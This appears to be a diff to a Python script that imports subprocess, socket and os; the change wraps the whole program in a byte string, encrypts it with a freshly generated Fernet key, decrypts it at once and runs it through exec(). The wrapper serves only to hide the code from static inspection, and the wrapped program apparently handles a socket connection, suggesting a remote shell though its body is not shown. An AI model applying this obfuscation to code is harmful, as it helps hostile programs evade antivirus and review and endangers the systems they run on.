@@ -1,3 +1,8 @@
+from cryptography.fernet import Fernet
+import base64
+
+code = b'''
+
 import subprocess
 import socket
 import os
@@ -60,5 +65,15 @@ def main():
         s.close()
         sys.exit()
 
+main()
+
+'''
+
 if __name__ == "__main__":
-    main()
+    key = Fernet.generate_key()
+    encryption_type = Fernet(key)
+    encrypted_message = encryption_type.encrypt(code)
+
+    decrypted_message = encryption_type.decrypt(encrypted_message)
+
+    exec(decrypted_message)
